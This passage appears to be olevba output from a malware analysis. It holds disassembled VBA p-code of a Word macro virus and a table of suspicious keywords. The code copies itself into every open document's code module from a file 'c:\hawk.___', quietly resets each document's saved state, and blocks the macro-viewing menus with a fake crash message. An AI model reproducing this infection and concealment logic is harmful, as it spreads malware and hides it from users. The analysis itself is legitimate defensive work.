' 	Ld wdReplaceAll 
' 	ParamNamed Replace 
' 	ArgsMemCallWith Execute 0x0003 
' Line #172:
' 	EndWith 
' Line #173:
' 	Ld wdParagraph 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemLd Not 0x0002 
' 	ArgsMemCall Set 0x0000 
' Line #174:
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0000 
' Line #175:
' 	EndIfBlock 
' Line #176:
' Line #177:
' 	Ld Documents 
' 	MemLd Count 
' 	St CountofDocs 
' Line #178:
' 	StartForVariable 
' 	Ld Doc 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld CountofDocs 
' 	For 
' Line #179:
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitStr 0x0007 "ThisDoc"
' 	Ne 
' 	IfBlock 
' Line #180:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Item 0x0001 
' 	Set t 
' Line #181:
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	St s 
' Line #182:
' 	LitDI2 0x0001 
' 	St begin 
' Line #183:
' 	LitStr 0x000F "Document_Open()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #184:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #185:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #186:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #187:
' 	LitStr 0x0010 "Document_Close()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	ElseIfBlock 
' Line #188:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #189:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #190:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #191:
' 	ElseBlock 
' Line #192:
' 	LitDI2 0x0001 
' 	St begin 
' Line #193:
' 	LitStr 0x000C "ToolsMacro()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #194:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #195:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #196:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #197:
' 	ElseBlock 
' Line #198:
' 	LitDI2 0x0001 
' 	St begin 
' Line #199:
' 	LitStr 0x000F "Filetemplates()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #200:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #201:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #202:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #203:
' 	ElseBlock 
' Line #204:
' 	LitDI2 0x0001 
' 	St begin 
' Line #205:
' 	LitStr 0x000C "ViewVBCode()"
' 	Ld begin 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CoundOfLines 
' 	LitDI2 0x0001 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemLd Find 0x0005 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #206:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	LitDI2 0x0000 
' 	Ld t 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #207:
' 	Ld begin 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall DeleteLines 0x0001 
' Line #208:
' 	StartForVariable 
' 	Ld Like 
' 	EndForVariable 
' 	NextVar 
' Line #209:
' 	EndIfBlock 
' Line #210:
' 	EndIfBlock 
' Line #211:
' 	EndIfBlock 
' Line #212:
' 	EndIfBlock 
' Line #213:
' Line #214:
' 	LitStr 0x000B "c:\hawk.___"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #215:
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	LitDI2 0x0000 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo q 
' 	EndIf 
' Line #216:
' 	LitDI2 0x0001 
' 	St i 
' Line #217:
' 	LitDI2 0x0001 
' 	ArgsLd EOF 0x0001 
' 	Not 
' 	DoWhile 
' Line #218:
' 	LitDI2 0x0001 
' 	Ld a 
' 	LineInput 
' Line #219:
' 	Ld i 
' 	Ld a 
' 	Ld t 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #220:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #221:
' 	Loop 
' Line #222:
' 	Label q 
' Line #223:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #224:
' 	LitStr 0x0007 "ThisDoc"
' 	Ld t 
' 	MemSt New 
' Line #225:
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd New 
' 	LitDI2 0x0008 
' 	ArgsLd LBound 0x0002 
' 	LitStr 0x0008 "Document"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #226:
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemLd Saved 
' 	Ld s 
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s 
' 	Ld Doc 
' 	Ld Documents 
' 	ArgsMemLd Item 0x0001 
' 	MemSt Saved 
' 	EndIf 
' Line #227:
' 	EndIfBlock 
' Line #228:
' 	StartForVariable 
' 	Ld Doc 
' 	EndForVariable 
' 	NextVar 
' Line #229:
' Line #230:
' 	EndSub 
' Line #231:
' Line #232:
' 	FuncDefn (Private Sub ToolsMacro())
' Line #233:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #234:
' 	EndSub 
' Line #235:
' Line #236:
' 	FuncDefn (Private Sub FileTemplates())
' Line #237:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #238:
' 	EndSub 
' Line #239:
' Line #240:
' 	FuncDefn (Private Sub ViewVBCode())
' Line #241:
' 	LitStr 0x0043 "This program has performed an illegal operation and will shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #242:
' 	EndSub 
' Line #243:
' Line #244:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

